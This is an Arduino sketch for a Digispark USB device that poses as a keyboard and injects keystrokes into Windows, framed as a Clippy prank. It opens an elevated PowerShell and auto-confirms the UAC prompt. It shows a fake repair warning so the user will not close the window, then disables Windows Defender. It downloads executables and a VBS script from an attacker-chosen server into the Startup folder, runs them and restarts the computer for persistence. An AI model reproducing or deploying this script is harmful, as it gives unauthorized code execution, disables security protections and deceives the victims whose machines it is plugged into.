/*

Digispark

Payload: clippy.exe

Decsription: Uses powershell to download payload in "startup" folder as to load on startup. User cannot stop payload as it will run in memory and Windows will not allow user to delete payload. Powershell executes "clippy.exe" and "clippy.vbs" as administrator from webserver. Disable Windows Defender as to not find payload. 

clippy.exe: Fun joke program creates an annoying Clippy/Clippit Office Assistant popup form Microsoft Word (version 97 to 2003). Popup every 60 sec created by http://rjlpranks.com/pranks/clippy/ 

clippy.vbs: Fake windows error to deter user from closing powershell. 

Created by Tyler Smith - DataDucks.3utilities.com/forum (Forums) - DataDucks.Web.Development@gmail.com

Please see "clippy.txt" for list of phrases.

 */

 
 #include "DigiKeyboard.h"
 /* Init function */

    void setup() {
      // don't need to set anything up to use DigiKeyboard
    }


    void loop() {
      // this is generally not necessary but with some older systems it seems to
      // prevent missing the first character after a delay:
      DigiKeyboard.sendKeyStroke(0);
      
      //turn LED off while code is running, this means the device is safe to unplug as soon as the LED turns back on
      pinMode(1, OUTPUT); //LED on Model A
      digitalWrite(1, HIGH);
      DigiKeyboard.delay(500);
      digitalWrite(1, LOW);
      // Open powershell
      DigiKeyboard.sendKeyStroke(0);
      DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
      DigiKeyboard.delay(100);
      DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(1000);
      DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
      DigiKeyboard.delay(1000);

      //Try to warn user to try and prevent user closing window
      DigiKeyboard.print("DO NOT CLOSE THIS WINDOW!! WINDOWS REPAIRING "cxdrv(1).dll" REPAIRING MISSING FILE STRUCTURE");
      DigiKeyboard.print("DO NOT CLOSE THIS WINDOW OR POSSIBLE CURRUPTION OF C:\");
      DigiKeyboard.delay(2000);
      DigiKeyboard.print("cls")
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      // Disable Windows Defender
      DigiKeyboard.print("STRING Set-MpPreference -DisableRealtimeMonitoring $true");
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Execute code from the interwebs
      // Modify 000.0.0.0 with your IP address
      DigiKeyboard.print("$StartupDir = [environment]::getfolderpath('Startup');cd $StartupDir;mkdir clippy;cd clippy;Invoke-WebRequest \"http://000.0.0.0/clippy.exe\" -OutFile \clippy.exe\";Invoke-WebRequest \"http://000.0.0.0/clippy.txt\" -OutFile \"clippy.txt\";Invoke-WebRequest \"http://000.0.0.0/clippy.vbs\" -OutFile \"clippy.vbs\"");
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Execute clippy.exe
      DigiKeyboard.print("./clippy.exe");
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(100);
      // Execute clippy.txt
      DigiKeyboard.print("./clippy.vbs");
      DigiKeyboard.delay(100);
      DigiKeyboard.sendKeyStroke(KEY_ENTER);
      DigiKeyboard.delay(1000);
      // Restart computer payload will execute on startup ($StartupDir = [environment]::getfolderpath('Startup'))
      DigiKeyboard.print("Restart-Computer")
      while(true){
        //do nothing
      }
    }
